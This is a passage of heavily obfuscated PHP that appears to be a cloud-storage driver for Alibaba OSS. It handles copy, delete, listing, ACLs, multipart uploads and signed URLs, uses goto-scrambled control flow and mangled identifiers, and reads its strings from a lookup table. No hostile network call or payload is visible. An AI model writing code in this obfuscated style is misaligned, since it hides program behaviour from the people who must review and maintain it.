$bÈ‹ÒˆÀÂğ, $FæñÃ…ÔËÚ) { $b–‘†™ÃÔ =& $_SERVER[³‘’¼äÑ™ÔÍ]; try { goto E¤­Ö‹ï­; dô®÷¬ø¤‡: $DŠ‰èŞ·‡Œ = 1024 * 1024 * 10; $aßÉÌİø¹ = $this->client->generateMultiuploadParts($FæñÃ…ÔËÚ, $DŠ‰èŞ·‡Œ); foreach ($aßÉÌİø¹ as $e÷ËîÊ§â´ => $EÉŒ‰êªÜ) { $CŞÏßî´ = $DÒ¤‚è¶¹Ø + (int) $EÉŒ‰êªÜ[$b–‘†™ÃÔ[1191]]; $B°˜êÎòİå = (int) $EÉŒ‰êªÜ[$b–‘†™ÃÔ[325]] + $CŞÏßî´ - 1; $D‰„Ü¯ğŒ¤ = array($b–‘†™ÃÔ[1192] => $CŞÏßî´, $b–‘†™ÃÔ[1193] => $B°˜êÎòİå); $DÃó¢ë‡ö“[] = $this->client->uploadPartCopy($this->bucket, $bË—ÈÑâƒá, $this->bucket, $this->pathEncode($bÈ‹ÒˆÀÂğ), $eØÌ¨Õ¿Ë«, $AÒ²Ô£ø«, $D‰„Ü¯ğŒ¤); $eØÌ¨Õ¿Ë« = $eØÌ¨Õ¿Ë« + 1; } goto B­ø«×œ; A£³ µÛ²Ö: $eØÌ¨Õ¿Ë« = 1; $DÒ¤‚è¶¹Ø = 0; $DÃó¢ë‡ö“ = array(); goto dô®÷¬ø¤‡; E¤­Ö‹ï­: $D›š™ææ À = array(); if ($C¤ÈäÅÚ° = $this->hashMd5($bË—ÈÑâƒá)) { $D›š™ææ À = array(OSS\OssClient::OSS_HEADERS => array($b–‘†™ÃÔ[1190] => $C¤ÈäÅÚ°)); } $AÒ²Ô£ø« = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bÈ‹ÒˆÀÂğ), $D›š™ææ À); goto A£³ µÛ²Ö; B­ø«×œ: $fŒÖªœÊ†¤ = array(); foreach ($DÃó¢ë‡ö“ as $e÷ËîÊ§â´ => $bßõ¥ ­´©) { $fŒÖªœÊ†¤[] = array($b–‘†™ÃÔ[1194] => $e÷ËîÊ§â´ + 1, $b–‘†™ÃÔ[1195] => $bßõ¥ ­´©); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($bÈ‹ÒˆÀÂğ), $AÒ²Ô£ø«, $fŒÖªœÊ†¤); goto A¤…àİ³–à; A¤…àİ³–à: } catch (OSS\Core\OssException $FĞ‹Á ‹¬ø) { return !1; } return !0; } public function moveFile($b‰Ç’‚®ùÏ, $DïÈ¸‘ÇåÓ) { if ($this->copyFile($b‰Ç’‚®ùÏ, $DïÈ¸‘ÇåÓ)) { $this->remove($b‰Ç’‚®ùÏ); return $this->getPathOuter($DïÈ¸‘ÇåÓ); } return !1; } public function delFile($e­‰–ôÈŞ¨) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($e­‰–ôÈŞ¨)); } catch (OSS\Core\OssException $F´°‰´Á„) { return !1; } return !0; } public function delFolder($cÇˆ‚ÃÌÛÙ) { $a¸èç¥Š¹Ü =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f¬»öÍÔˆÊ = $this->fileList($cÇˆ‚ÃÌÛÙ); if (!empty($cÇˆ‚ÃÌÛÙ) && !in_array(trim($cÇˆ‚ÃÌÛÙ, $a¸èç¥Š¹Ü[8]) . $a¸èç¥Š¹Ü[8], $f¬»öÍÔˆÊ[$a¸èç¥Š¹Ü[73]])) { $f¬»öÍÔˆÊ[$a¸èç¥Š¹Ü[73]][] = trim($cÇˆ‚ÃÌÛÙ, $a¸èç¥Š¹Ü[8]) . $a¸èç¥Š¹Ü[8]; } foreach (array_chunk($f¬»öÍÔˆÊ[$a¸èç¥Š¹Ü[73]], 1000) as $A“ƒºÚ•ƒŸ) { try { $this->client->deleteObjects($this->bucket, $A“ƒºÚ•ƒŸ); } catch (OSS\Core\OssException $FÑœâöì) { continue; } } return !0; } public function rename($e…¤”ƒ×ó†, $B³ŞæÎÕ–Î) { return $this->renameObject($e…¤”ƒ×ó†, $B³ŞæÎÕ–Î); } private function fileInfo($fŒ«ª¥†, $d³–™¹ÒïÆ = array()) { goto DŸ‡õ©ã´; b‰İÑ“”‡Ö: return $døĞİ—ÖĞ”; goto Bß¤³ê¦êš; DŸ‡õ©ã´: $B‘ùø›¤å” =& $_SERVER[³‘’¼äÑ™ÔÍ]; $døĞİ—ÖĞ” = array($B‘ùø›¤å”[28] => $this->pathThis($fŒ«ª¥†), $B‘ùø›¤å”[75] => $this->getPathOuter($fŒ«ª¥†), $B‘ùø›¤å”[29] => $B‘ùø›¤å”[167], $B‘ùø›¤å”[187] => 0, $B‘ùø›¤å”[107] => 0, $B‘ùø›¤å”[77] => 0, $B‘ùø›¤å”[160] => $this->ext($fŒ«ª¥†), $B‘ùø›¤å”[188] => !0, $B‘ùø›¤å”[189] => !0); if (empty($d³–™¹ÒïÆ)) { $A¤Ù˜óÍ² = $this->objectMeta($fŒ«ª¥†); if (!$A¤Ù˜óÍ²) { return $døĞİ—ÖĞ”; } $d³–™¹ÒïÆ = array($B‘ùø›¤å”[107] => strtotime($A¤Ù˜óÍ²[$B‘ùø›¤å”[1196]]), $B‘ùø›¤å”[77] => $A¤Ù˜óÍ²[$B‘ùø›¤å”[1197]] + 0); } goto D‹ ñ‘»; D‹ ñ‘»: if (isset($d³–™¹ÒïÆ[$B‘ùø›¤å”[77]])) { $døĞİ—ÖĞ”[$B‘ùø›¤å”[77]] = $d³–™¹ÒïÆ[$B‘ùø›¤å”[77]]; } if (isset($d³–™¹ÒïÆ[$B‘ùø›¤å”[107]])) { $døĞİ—ÖĞ”[$B‘ùø›¤å”[107]] = $d³–™¹ÒïÆ[$B‘ùø›¤å”[107]]; } if (isset($d³–™¹ÒïÆ[$B‘ùø›¤å”[190]]) && !trim($døĞİ—ÖĞ”[$B‘ùø›¤å”[107]])) { $døĞİ—ÖĞ”[$B‘ùø›¤å”[107]] = $d³–™¹ÒïÆ[$B‘ùø›¤å”[190]]; } goto b‰İÑ“”‡Ö; Bß¤³ê¦êš: } private function folderInfo($c¡ç„îî‡, $FÍâñìê‡¼ = array()) { $Bêª‚¹„¤© =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E¯•¼ŒöïÜ = array($Bêª‚¹„¤©[28] => $this->pathThis($c¡ç„îî‡), $Bêª‚¹„¤©[75] => $this->getPathOuter($Bêª‚¹„¤©[8] . $c¡ç„îî‡), $Bêª‚¹„¤©[29] => $Bêª‚¹„¤©[76], $Bêª‚¹„¤©[187] => 0, $Bêª‚¹„¤©[107] => 0, $Bêª‚¹„¤©[188] => !0, $Bêª‚¹„¤©[189] => !0); if (empty($FÍâñìê‡¼)) { $c¡ç„îî‡ = rtrim($c¡ç„îî‡, $Bêª‚¹„¤©[8]) . $Bêª‚¹„¤©[8]; $fó¸‰äØ›‘ = $this->objectMeta($c¡ç„îî‡); if (!$fó¸‰äØ›‘) { return $E¯•¼ŒöïÜ; } $FÍâñìê‡¼ = array($Bêª‚¹„¤©[187] => $fó¸‰äØ›‘[$Bêª‚¹„¤©[1198]][$Bêª‚¹„¤©[1199]], $Bêª‚¹„¤©[107] => strtotime($fó¸‰äØ›‘[$Bêª‚¹„¤©[1196]])); } if (isset($FÍâñìê‡¼[$Bêª‚¹„¤©[107]])) { $E¯•¼ŒöïÜ[$Bêª‚¹„¤©[107]] = $FÍâñìê‡¼[$Bêª‚¹„¤©[107]]; } if (isset($FÍâñìê‡¼[$Bêª‚¹„¤©[187]])) { $E¯•¼ŒöïÜ[$Bêª‚¹„¤©[187]] = $FÍâñìê‡¼[$Bêª‚¹„¤©[187]]; } return $E¯•¼ŒöïÜ; } public function listPath($C¨ô¾ğœòƒ, $DÅ–Š¸­ã = false) { $FÏù†òì·¡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Aö»ãÖÅè = $this->fileList($C¨ô¾ğœòƒ, $FÏù†òì·¡[8], !0); foreach ($Aö»ãÖÅè[$FÏù†òì·¡[74]] as $c±Å¤ë¯¢ø => $e­„ ·³Â¾) { $Aö»ãÖÅè[$FÏù†òì·¡[74]][$c±Å¤ë¯¢ø] = $this->folderInfo($e­„ ·³Â¾, $e­„ ·³Â¾); } foreach ($Aö»ãÖÅè[$FÏù†òì·¡[73]] as $c±Å¤ë¯¢ø => $e­„ ·³Â¾) { $Aö»ãÖÅè[$FÏù†òì·¡[73]][$c±Å¤ë¯¢ø] = $this->fileInfo($e­„ ·³Â¾[$FÏù†òì·¡[28]], $e­„ ·³Â¾); } return $Aö»ãÖÅè; } public function has($B£É™£ù„÷, $a·ë©†…‰‹ = false, $c¸‘ŞÉÍç­ = true) { goto dÑË—á‘ˆ; dÑË—á‘ˆ: $a—•ïŒÊš¬ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B£É™£ù„÷ = trim($B£É™£ù„÷, $a—•ïŒÊš¬[8]); $B¡ÔïîÈÒî = empty($B£É™£ù„÷) ? $a—•ïŒÊš¬[33] : $B£É™£ù„÷ . $a—•ïŒÊš¬[8]; goto aÏ‰º‰¡„; aÏ‰º‰¡„: $E‡á¥ÀíÔ× = $a—•ïŒÊš¬[33]; $f”Ü¤â¸æ = 500; $aöÏÖíƒ´Œ = 0; goto f“ ¬•·“; b®åïŸ»—¹: return !1; goto fí¢óğĞÄ ; f“ ¬•·“: $E²±°…‡Ã´ = 0; while (!0) { $E†ì‚Œµ†™ = array($a—•ïŒÊš¬[1187] => $a—•ïŒÊš¬[8], $a—•ïŒÊš¬[186] => $B¡ÔïîÈÒî, $a—•ïŒÊš¬[1188] => $f”Ü¤â¸æ, $a—•ïŒÊš¬[1189] => $E‡á¥ÀíÔ×); try { $AÁ¨ç¿…à = $this->client->listObjects($this->bucket, $E†ì‚Œµ†™); } catch (OSS\Core\OssException $bİë…é) { break; } $E‡á¥ÀíÔ× = $AÁ¨ç¿…à->getNextMarker(); $cø”¢Àç = $AÁ¨ç¿…à->getObjectList(); $bå—ĞâèÃß = $AÁ¨ç¿…à->getPrefixList(); if ($a·ë©†…‰‹) { if (count($cø”¢Àç) > 1 || count($cø”¢Àç) == 1 && $cø”¢Àç[0]->getKey() != $B¡ÔïîÈÒî) { $aöÏÖíƒ´Œ += count($cø”¢Àç) - 1; } if (!empty($bå—ĞâèÃß)) { $E²±°…‡Ã´ += count($bå—ĞâèÃß); } if ($E‡á¥ÀíÔ× === $a—•ïŒÊš¬[33]) { break; } continue; } if ($c¸‘ŞÉÍç­) { if (!empty($cø”¢Àç)) { if (count($cø”¢Àç) > 1 || $cø”¢Àç[0]->getKey() != $B¡ÔïîÈÒî) { return !0; } } } else { if (!empty($bå—ĞâèÃß)) { return !0; } } if ($E‡á¥ÀíÔ× === $a—•ïŒÊš¬[33]) { break; } } if ($a·ë©†…‰‹) { return array($a—•ïŒÊš¬[191] => $aöÏÖíƒ´Œ, $a—•ïŒÊš¬[192] => $E²±°…‡Ã´); } goto b®åïŸ»—¹; fí¢óğĞÄ : } public function listAll($b†ğòí„íò) { $cæ¬¹ôö…º =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A‡Ãæì¤¸ì = $this->fileList($b†ğòí„íò, $cæ¬¹ôö…º[33], !0); $b¾¡¿õ› = array(); foreach ($A‡Ãæì¤¸ì[$cæ¬¹ôö…º[73]] as $AÎÈ’ò¿Åæ) { $b¾¡¿õ›[$AÎÈ’ò¿Åæ[$cæ¬¹ôö…º[28]]] = $AÎÈ’ò¿Åæ[$cæ¬¹ôö…º[77]]; } return $this->listAllFiles($b†ğòí„íò, array_keys($b¾¡¿õ›), $b¾¡¿õ›); } public function canRead($EŠÖ§ôèÛÚ) { $D²ó×¡é£À =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bÎ¯‡Ÿèˆ = $this->pathAcl($EŠÖ§ôèÛÚ); return $bÎ¯‡Ÿèˆ == $D²ó×¡é£À[1200] || $bÎ¯‡Ÿèˆ == $D²ó×¡é£À[491] ? !0 : !1; } public function canWrite($C„ŠÕ¢õ£„) { $D’ÏëÁÅ£… = $this->pathAcl($C„ŠÕ¢õ£„); return $D’ÏëÁÅ£… == $_SERVER[³‘’¼äÑ™ÔÍ][491] ? !0 : !1; } public function pathAcl($AâÃ“•‚êò) { goto aÔÑŠòáªê; F‡øáŞˆ¬: $c÷½’ë„°š = $AÃÚ÷„êµ == $B†é´ŞÏÛ[34] ? $this->bucketAcl : $AÃÚ÷„êµ; if ($c÷½’ë„°š == $B†é´ŞÏÛ[1201]) { return $B†é´ŞÏÛ[1200]; } if ($c÷½’ë„°š == $B†é´ŞÏÛ[1202]) { return $B†é´ŞÏÛ[491]; } goto a¶Ó‡§˜Í§; aÔÑŠòáªê: $B†é´ŞÏÛ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $AÃÚ÷„êµ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($AâÃ“•‚êò)); } catch (OSS\Core\OssException $CŒˆ­ÏŒ Í) { return !1; } goto F‡øáŞˆ¬; a¶Ó‡§˜Í§: return $c÷½’ë„°š; goto bÎ¾³¨”á¹; bÎ¾³¨”á¹: } private function chmodPath($bœ¥—¶¹È, $C¥Ê¢½§É± = '') { $CßßÊ„Ãì =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eíŞ±Ò±‘ò = empty($C¥Ê¢½§É±) ? $CßßÊ„Ãì[1202] : $C¥Ê¢½§É±; $fàÀ¹¢ğ§ = array($CßßÊ„Ãì[34], $CßßÊ„Ãì[185], $CßßÊ„Ãì[1201], $CßßÊ„Ãì[1202]); if (!in_array($eíŞ±Ò±‘ò, $fàÀ¹¢ğ§)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($bœ¥—¶¹È), $eíŞ±Ò±‘ò); } catch (OSS\Core\OssException $F¥İ¯ïØ˜È) { return !1; } return !0; } public function getContent($A–Û®Êœò×) { return $this->fileSubstr($A–Û®Êœò×, -1); } public function setContent($CêØ‹âÍÕ², $a«¯êšê©Ù = '') { $fĞó¢Îîä =& $_SERVER[³‘’¼äÑ™ÔÍ]; try { $A‚†¦ïÌ³ = $this->trafficLimit($fĞó¢Îîä[1203]); $Eïá“»¼×¢ = $this->client->putObject($this->bucket, $this->pathEncode($CêØ‹âÍÕ²), $a«¯êšê©Ù, $A‚†¦ïÌ³); } catch (OSS\Core\OssException $aÒ¸˜‘Ä«) { return !1; } $Fİ…†“±œ® = array($fĞó¢Îîä[1190] => trim($Eïá“»¼×¢[$fĞó¢Îîä[1204]], $fĞó¢Îîä[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($CêØ‹âÍÕ²))); $this->updateObjMeta($CêØ‹âÍÕ², $Fİ…†“±œ®); return isset($Eïá“»¼×¢[$fĞó¢Îîä[1205]][$fĞó¢Îîä[1152]]) ? (int) $Eïá“»¼×¢[$fĞó¢Îîä[1205]][$fĞó¢Îîä[1152]] : strlen($Eïá“»¼×¢); } private function updateObjMeta($dò³ôŒ·Í¶, $c–œßÂñâ¶) { $dò³ôŒ·Í¶ = $this->pathEncode($dò³ôŒ·Í¶); try { $bœ÷»ÌÁ‚Š = array(OSS\OssClient::OSS_HEADERS => $c–œßÂñâ¶); $this->client->copyObject($this->bucket, $dò³ôŒ·Í¶, $this->bucket, $dò³ôŒ·Í¶, $bœ÷»ÌÁ‚Š); } catch (OSS\Core\OssException $F‰¹…±Ğ¹Œ) { return !1; } return !0; } public function upload($C§ŒËîš´ƒ, $F„îƒ½‹İ†, $F¨ù¦šèİ = false, $E¨‚§æ‡ôî = REPEAT_REPLACE) { $d“×‰×¡á¥ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $a‚œ†­¤ßÍ = trim($C§ŒËîš´ƒ, $d“×‰×¡á¥[8]); $B›¶›…¨¹Ì = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($d“×‰×¡á¥[1190] => @md5_file($F„îƒ½‹İ†)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($C§ŒËîš´ƒ))); $B›¶›…¨¹Ì = $this->trafficLimit($d“×‰×¡á¥[1203], $B›¶›…¨¹Ì); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($a‚œ†­¤ßÍ), $F„îƒ½‹İ†, $B›¶›…¨¹Ì); } catch (OSS\Core\OssException $e¦ğê—Ù½) { return !1; } return $this->getPathOuter($C§ŒËîš´ƒ); } public function getHost() { $CÄèÏ¡Èƒ˜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Câ›—œ­Î = explode($CÄèÏ¡Èƒ˜[171], parent::getHost()); return $Câ›—œ­Î[0] . $CÄèÏ¡Èƒ˜[171] . $this->bucket . $CÄèÏ¡Èƒ˜[91] . $Câ›—œ­Î[1]; } public function uploadFormData($Bé“­†İ×, $EŠµë…Â´ = 3600) { goto cì‹…Å’”; cì‹…Å’”: $dÁ¹õÓÒ‚Ê =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!($E„¨ªá¤¥Œ = $this->getHost())) { return !1; } $EÌô²Â÷Å = $EŠµë…Â´; goto AØ„øâÕ‚; c Æõ‘Õö·: $e½Ù¼¤¾«å = base64_encode(hash_hmac($dÁ¹õÓÒ‚Ê[218], $c¤ø˜ëäø‡, $this->secret, !0)); $BĞÉÊŸµ˜ = array($dÁ¹õÓÒ‚Ê[1116] => $c¤ø˜ëäø‡, $dÁ¹õÓÒ‚Ê[1209] => $this->accessKey, $dÁ¹õÓÒ‚Ê[1112] => $dÁ¹õÓÒ‚Ê[1104], $dÁ¹õÓÒ‚Ê[1210] => $e½Ù¼¤¾«å, $dÁ¹õÓÒ‚Ê[169] => $E„¨ªá¤¥Œ); $BĞÉÊŸµ˜ = $this->trafficLimit($dÁ¹õÓÒ‚Ê[1203], $BĞÉÊŸµ˜); goto dˆ÷ëÎšÄ²; AØ„øâÕ‚: $e†ÄÓÕ„¥• = date($dÁ¹õÓÒ‚Ê[1206], time() + $EÌô²Â÷Å); $dÇÔÎÙƒ—¾ = new DateTime($e†ÄÓÕ„¥•); $b‹Ëšˆóœ = $dÇÔÎÙƒ—¾->format(DateTime::ISO8601); goto EáİÖ­‹²; dˆ÷ëÎšÄ²: return $BĞÉÊŸµ˜; goto aÈùÎøŠò‹; aèÀ×Áãë: $EÛÆ‰³±ÒÚ = $this->pathFather($Bé“­†İ×); $A’¡›¥Û = array($dÁ¹õÓÒ‚Ê[1106] => $b‹Ëšˆóœ, $dÁ¹õÓÒ‚Ê[1107] => array(array($dÁ¹õÓÒ‚Ê[1208], 0, $d®•¤´•…Ú), array($dÁ¹õÓÒ‚Ê[1110], $dÁ¹õÓÒ‚Ê[1111], $EÛÆ‰³±ÒÚ))); $c¤ø˜ëäø‡ = base64_encode(json_encode($A’¡›¥Û)); goto c Æõ‘Õö·; EáİÖ­‹²: $c±ÈÎáØâŸ = strpos($b‹Ëšˆóœ, $dÁ¹õÓÒ‚Ê[284]); $b‹Ëšˆóœ = substr($b‹Ëšˆóœ, 0, $c±ÈÎáØâŸ) . $dÁ¹õÓÒ‚Ê[1207]; $d®•¤´•…Ú = 1048576000 * 5; goto aèÀ×Áãë; aÈùÎøŠò‹: } public function multiUploadFormData($aøÙÒÌİƒ¢, $dÁ˜ô‡Ş¤» = 3600) { $A¸Õëù°ƒ§ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!($D–«èÕªÒĞ = $this->getHost())) { return !1; } $dàˆÉ”Âœõ = $this->trafficLimit($A¸Õëù°ƒ§[1203]); $cÊ££ŠÖ§š = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($aøÙÒÌİƒ¢), $dàˆÉ”Âœõ); return array($A¸Õëù°ƒ§[209] => $cÊ££ŠÖ§š, $A¸Õëù°ƒ§[169] => $D–«èÕªÒĞ . $A¸Õëù°ƒ§[8] . $this->pathEncode($aøÙÒÌİƒ¢), $A¸Õëù°ƒ§[210] => gmdate($A¸Õëù°ƒ§[1211]), $A¸Õëù°ƒ§[89] => $aøÙÒÌİƒ¢); } public function multiUploadAuthData($a÷Ÿº‹î¶, $a÷ŸĞÛ»Åí = array()) { goto f‚Æ‡ùâ; AƒÖ®¹¿×: $B•Š’ô©± = array($cŠôèìÔñ„[212], $cŠôèìÔñ„[33], $cŠôèìÔñ„[116], $d˜¹Ü¾š‹Î, "\x78\x2d\157\163\163\x2d\x64\x61\164\145\x3a{$d˜¹Ü¾š‹Î}", $cŠôèìÔñ„[8] . $this->bucket . $cŠôèìÔñ„[8] . $B‡ÚÁÍÍÌç . $F‹°¡÷ö»¦); if (strpos($F‹°¡÷ö»¦, $cŠôèìÔñ„[213]) === 0) { $B•Š’ô©±[0] = $cŠôèìÔñ„[214]; if ($FŞÂãğ§îÌ = $this->trafficLimit($cŠôèìÔñ„[1203])) { $B‡ÚÁÍÍÌç = $cŠôèìÔñ„[1212]; array_splice($B•Š’ô©±, 5, 0, $B‡ÚÁÍÍÌç . $cŠôèìÔñ„[4] . $FŞÂãğ§îÌ[$B‡ÚÁÍÍÌç]); } } if (isset($a÷ŸĞÛ»Åí[$cŠôèìÔñ„[215]]) && $a÷ŸĞÛ»Åí[$cŠôèìÔñ„[215]] == $cŠôèìÔñ„[216]) { $B•Š’ô©±[0] = $cŠôèìÔñ„[216]; } goto AÌ²Ş²ìê·; f‚Æ‡ùâ: $cŠôèìÔñ„ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d˜¹Ü¾š‹Î = isset($a÷ŸĞÛ»Åí[$cŠôèìÔñ„[210]]) ? $a÷ŸĞÛ»Åí[$cŠôèìÔñ„[210]] : gmdate($cŠôèìÔñ„[1211]); $F‹°¡÷ö»¦ = isset($a÷ŸĞÛ»Åí[$cŠôèìÔñ„[160]]) ? $a÷ŸĞÛ»Åí[$cŠôèìÔñ„[160]] : $cŠôèìÔñ„[33]; goto Aª¢Ş°ÑÂ²; AÌ²Ş²ìê·: if (!empty($a÷ŸĞÛ»Åí[$cŠôèìÔñ„[1213]])) { $aœ¹×ºÁƒŞ = array_merge(array($B•Š’ô©±[4]), $a÷ŸĞÛ»Åí[$cŠôèìÔñ„[1213]]); sort($aœ¹×ºÁƒŞ); $B•Š’ô©±[4] = implode($cŠôèìÔñ„[217], $aœ¹×ºÁƒŞ); } $E«åÅØñ¯ê = implode($cŠôèìÔñ„[217], $B•Š’ô©±); $DÅßµÄÍØÉ = base64_encode(hash_hmac($cŠôèìÔñ„[218], $E«åÅØñ¯ê, $this->secret, !0)); goto A¡Ã‡ æğ; Aª¢Ş°ÑÂ²: $B‡ÚÁÍÍÌç = $a÷Ÿº‹î¶; if (isset($a÷ŸĞÛ»Åí[$cŠôèìÔñ„[89]])) { $B‡ÚÁÍÍÌç = $a÷ŸĞÛ»Åí[$cŠôèìÔñ„[89]]; unset($a÷ŸĞÛ»Åí[$cŠôèìÔñ„[89]]); } if (isset($a÷ŸĞÛ»Åí[$cŠôèìÔñ„[211]])) { $a÷ŸĞÛ»Åí[$cŠôèìÔñ„[210]] = $d˜¹Ü¾š‹Î; return $this->listUploadParts($B‡ÚÁÍÍÌç, $a÷ŸĞÛ»Åí); } goto AƒÖ®¹¿×; A¡Ã‡ æğ: $f‰âÕ¡¾È = $cŠôèìÔñ„[1214] . $this->accessKey . $cŠôèìÔñ„[4] . $DÅßµÄÍØÉ; if (strpos($F‹°¡÷ö»¦, $cŠôèìÔñ„[213]) === 0) { $f‰âÕ¡¾È = array($cŠôèìÔñ„[220] => $f‰âÕ¡¾È, $cŠôèìÔñ„[210] => $d˜¹Ü¾š‹Î); if ($FŞÂãğ§îÌ) { $f‰âÕ¡¾È = array_merge($f‰âÕ¡¾È, $FŞÂãğ§îÌ); } } return $f‰âÕ¡¾È; goto då©¼åœÆ¿; då©¼åœÆ¿: } public function listUploadParts($eÌóåÆÍœ¿, $AîÛîÅ­¨) { goto dŠóŠ‘¼Úä; A²Ã”ÌÔ³¡: $D¦È‰¯ØÖà = $cË½×²ëÌÕ->getListPart(); $díª„Ãë¢² = array(); foreach ($D¦È‰¯ØÖà as $Aóë¡íßï„) { $díª„Ãë¢²[] = array($EàŒãîÁÂ–[1194] => $Aóë¡íßï„->getPartNumber(), $EàŒãîÁÂ–[1195] => trim($Aóë¡íßï„->getETag(), $EàŒãîÁÂ–[113])); } goto CöÇö”‡í“; dŠóŠ‘¼Úä: $EàŒãîÁÂ– =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b™·Œé´â  = parse_url_query($AîÛîÅ­¨[$EàŒãîÁÂ–[160]]); $cË½×²ëÌÕ = $this->client->listParts($this->bucket, $this->pathEncode($eÌóåÆÍœ¿), $b™·Œé´â [$EàŒãîÁÂ–[209]]); goto A²Ã”ÌÔ³¡; aäˆêÛö·Ó: return array($EàŒãîÁÂ–[220] => $E˜ãŞù²İß, $EàŒãîÁÂ–[210] => $AîÛîÅ­¨[$EàŒãîÁÂ–[210]], $EàŒãîÁÂ–[222] => $díª„Ãë¢²); goto d†—õÆÁ¿…; CöÇö”‡í“: unset($AîÛîÅ­¨[$EàŒãîÁÂ–[211]], $AîÛîÅ­¨[$EàŒãîÁÂ–[215]]); $E˜ãŞù²İß = $this->multiUploadAuthData($eÌóåÆÍœ¿, $AîÛîÅ­¨); if (empty($E˜ãŞù²İß)) { return !1; } goto aäˆêÛö·Ó; d†—õÆÁ¿…: } public function download($bç©…­ÔŸ™, $C•ÍÎµßŞ¥) { if ($this->isFolder($bç©…­ÔŸ™)) { return !1; } try { $bç£Æ…Î¤ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $C•ÍÎµßŞ¥); $bç£Æ…Î¤ = $this->trafficLimit($_SERVER[³‘’¼äÑ™ÔÍ][105], $bç£Æ…Î¤); $this->client->getObject($this->bucket, $this->pathEncode($bç©…­ÔŸ™), $bç£Æ…Î¤); } catch (OSS\Core\OssException $bóàù„£Û¢) { return !1; } return $C•ÍÎµßŞ¥; } public function fileSubstr($E¿²Æôƒ“¥, $c×Ş¶Û‰ = 0, $EÄ²ë×›Ÿ¨ = false) { if ($c×Ş¶Û‰ === -1) { $C¾¤ÓŠÉë‚ = array(); } else { if ($EÄ²ë×›Ÿ¨ === !1) { $fä´ë‚Ş«Ú = $this->size($E¿²Æôƒ“¥); } else { $fä´ë‚Ş«Ú = $c×Ş¶Û‰ + $EÄ²ë×›Ÿ¨ - 1; } $C¾¤ÓŠÉë‚ = array(OSS\OssClient::OSS_RANGE => "{$c×Ş¶Û‰}\55{$fä´ë‚Ş«Ú}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($E¿²Æôƒ“¥), $C¾¤ÓŠÉë‚); } catch (OSS\Core\OssException $E…‘ÈßÙÓ¸) { think_exception($E…‘ÈßÙÓ¸->getMessage()); return !1; } } private function trafficLimit($A”¼™¸¼„, $dˆ¦µ‡®¬ò = array()) { goto föÜµ¶‡«¬; dùÛ‚Áë…Õ: return $dˆ¦µ‡®¬ò; goto AÖÊó»Ôß; föÜµ¶‡«¬: $f–·¬ò‡İ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($A”¼™¸¼„ == $f–·¬ò‡İ[1203] && $this->isUploadServer() || $A”¼™¸¼„ == $f–·¬ò‡İ[105] && $this->isFileOutServer()) { return $dˆ¦µ‡®¬ò; } $c£¶òêÀŸ = floatval($GLOBALS[$f–·¬ò‡İ[6]][$f–·¬ò‡İ[84]][$f–·¬ò‡İ[103]][$A”¼™¸¼„]) * 1024 * 1024 * 8; goto dÔ¢ªù±; dÔ¢ªù±: if (!$c£¶òêÀŸ) { return $dˆ¦µ‡®¬ò; } $c£¶òêÀŸ = $c£¶òêÀŸ < 819200 ? 819200 : ($c£¶òêÀŸ > 838860800 ? 838860800 : $c£¶òêÀŸ); $dˆ¦µ‡®¬ò[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($c£¶òêÀŸ); goto dùÛ‚Áë…Õ; AÖÊó»Ôß: } public function link($b‚é¯Ä˜è, $A­ •Œì‰ = array()) { $EÊ­ÒÆ»ô¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->exist($b‚é¯Ä˜è) || $this->isFolder($b‚é¯Ä˜è)) { return !1; } try { $A­ •Œì‰ = $this->trafficLimit($EÊ­ÒÆ»ô¢[105], $A­ •Œì‰); $c‡ñÖç‹Û‡ = $this->client->signUrl($this->bucket, $this->pathEncode($b‚é¯Ä˜è), 3600 * 12, $EÊ­ÒÆ»ô¢[216], $A­ •Œì‰); return $this->getCdnLink($c‡ñÖç‹Û‡); } catch (OSS\Core\OssException $BÏÁï‚±–÷) { return !1; } } public function fileOut($aˆ “ÈÄ–ˆ, $d¹Ş„Šµé = false, $Bˆ¤Å¼ò±Ï = false, $c‹¿÷åéæé = '') { goto DÔ¯ÌƒÃõ; DÔ¯ÌƒÃõ: $d¢ÊÖ‹Å– =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$Bˆ¤Å¼ò±Ï) { $Bˆ¤Å¼ò±Ï = $this->pathThis($aˆ “ÈÄ–ˆ); } $Bˆ¤Å¼ò±Ï = rawurlencode($Bˆ¤Å¼ò±Ï); goto D×¶²¿ˆœ¯; b¶¸É³åÇ¥: $dÔéğØä²Õ = array(OSS\OssClient::OSS_SUB_RESOURCE => $d¢ÊÖ‹Å–[1215] . rawurlencode("{$d¹Ş„Šµé}\x3b\146\x69\x6c\145\156\x61\155\145\x3d{$Bˆ¤Å¼ò±Ï}")); $dÔéğØä²Õ[OSS\OssClient::OSS_SUB_RESOURCE] .= $d¢ÊÖ‹Å–[1216] . 